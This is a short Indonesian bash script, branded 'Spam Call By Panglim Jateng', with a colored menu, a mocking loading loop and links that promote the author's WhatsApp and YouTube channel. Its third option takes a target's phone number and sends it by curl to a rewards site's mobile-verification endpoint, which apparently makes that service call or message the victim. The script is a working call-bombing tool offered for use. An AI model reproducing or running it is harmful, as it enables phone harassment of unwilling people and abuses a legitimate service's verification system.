#!/usr/bin/bash
# copyright by panglima jateng
# code warna
b='\033[34;1m'
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
w='\033[37;1m'
y='\033[33;1m'
# variabrl
sumur=jagreward
open=xdg-open
# formulir
read -p "siapa nama kamu: " nama;
# animasi loading
for number in {1..10}; do
    sleep 1
    echo $nama" kamu ajg.... loading $number%"
done
# tampilan
clear
echo -e $g" ▄▀▀ █▀▄ ▄▀▄ █▄░▄█ ▄▀ ▄▀▄ █░░ █░░"
echo -e $g" ░▀▄ █░█ █▀█ █░█░█ █░ █▀█ █░▄ █░▄"
echo -e $g" ▀▀░ █▀░ ▀░▀ ▀░░░▀ ░▀ ▀░▀ ▀▀▀ ▀▀▀"
echo
echo -e $y"{"$c"•"$y"}"$c"   Spam Call By Panglim Jateng"$y"   {"$c"•"$y"}"
echo -e $g"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
echo -e $c"["$r"01"$c"]"$b" >"$y" WhatApp Author"
echo -e $c"["$r"02"$c"]"$b" >"$y" Subcribe"
echo -e $c"["$r"03"$c"]"$b" >"$y" Spam Call"
echo -e $g"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"$w
read -p "{•} Pilih: " groks;
# data base
if [ $groks = 1 ] || [ $groks = 01 ]; then
figlet WhastApp
sleep 2
$open http://Wa.me/+62881024978351
bash call.sh
fi
if [ $groks = 2 ] || [ $groks = 02 ]; then
figlet subcribe
$open https://youtube.com/channel/UCSJohuQCtqfD2P73Z65g8jg
bash call.sh
fi
if [ $groks = 3 ] || [ $groks = 03 ]; then
echo -e $p"Masukan nomor mulai dari"$c" 8xxxxx"$g
read -p " > " nomor
link="https://id.$sumur.com/member/verify-mobile/$nomor"
curl -s $link
fi
